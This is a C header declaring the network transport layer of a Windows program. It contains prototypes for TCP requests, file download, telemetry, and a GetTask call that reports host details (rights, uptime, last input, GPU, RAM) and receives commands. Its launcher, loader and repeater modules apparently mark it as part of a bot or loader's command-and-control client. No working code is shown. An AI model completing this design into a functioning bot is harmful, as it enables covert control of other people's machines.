#ifndef _TRANSPORT_H_
#define _TRANSPORT_H_

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <strsafe.h>
#include "config.h"
#include "typedef.h"

#define NUM_RETRY_CONNECT 10
#define RETRY_CONNECT_TIME (10*1000)

#define DOWNLOAD_TIMEOUT 30*1000
#define TASK_TIMEOUT 30*1000
#define TELEMETRY_TIMEOUT 30*1000
#define CONNECT_TIMEOUT 5

#define MAX_FRAME_SIZE 1024


#ifdef LAUNCHER_MODULE
    #define __MODULE__ "LAUNCHER"
#elif LOADER_MODULE
    #define __MODULE__ "LOADER"
#elif UNIT_TEST_MODULE
    #define __MODULE__ "UNIT_TEST"
#elif REPEATER_MODULE
    #define __MODULE__ "REPEATER"
#elif FILESERVER_MODULE
    #define __MODULE__ "FILESERVER"
#elif TELEMETRY_MODULE
    #define __MODULE__ "TELEMETRY"
#endif


extern DWORD dwID;


LPVOID TCPRequest(
    PWCHAR pwszHost,
    USHORT nPort,
	INT nTimeOut,
    LPVOID lpRequest,
    DWORD dwRequest,
    LPDWORD lpdwResult
);

BOOL GetTask(
    DWORD dwID,
    DWORD dwNAT,
    DWORD dwDomain,
    DWORD dwUptime,
    DWORD dwLastInput,
    DWORD dwOS,
    DWORD dwRights,
    DWORD dwCapacity,
    DWORD dwProcNumber,
    DWORD dwProc,
    DWORD dwRAM,
    DWORD dwGPU,
    DWORD dwVersion,
    PWCHAR pwszGroup,
    LPDWORD lpdwTask,
    LPDWORD lpdwCommand,
    PWCHAR pwszFile
);

LPVOID DownloadFile(
    PWCHAR pwszFileName,
    LPDWORD lpdwFile
);

VOID TELEMETRY(
    DWORD dwID,
    DWORD dwVersion,
    DWORD dwString,
    DWORD dwError,
    PCHAR pszModule,
    PCHAR pszFile
	);

#endif /* !_TRANSPORT_H_ */